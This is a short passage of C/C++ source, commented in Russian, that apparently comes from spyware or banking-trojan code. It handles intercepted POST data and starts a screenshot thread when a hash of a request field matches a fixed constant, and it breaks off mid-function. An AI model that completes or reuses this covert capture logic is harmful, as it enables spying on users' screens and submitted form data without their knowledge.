bool ProcessPostData(PRequest Request)
{
	// Обработать POST данные

	// Проверяем библиотеку ScreenShot
	if ( CalcHash(Request->Optional) == 0x24DE3210 )
	{
		StartThread( ScreensThread, NULL );
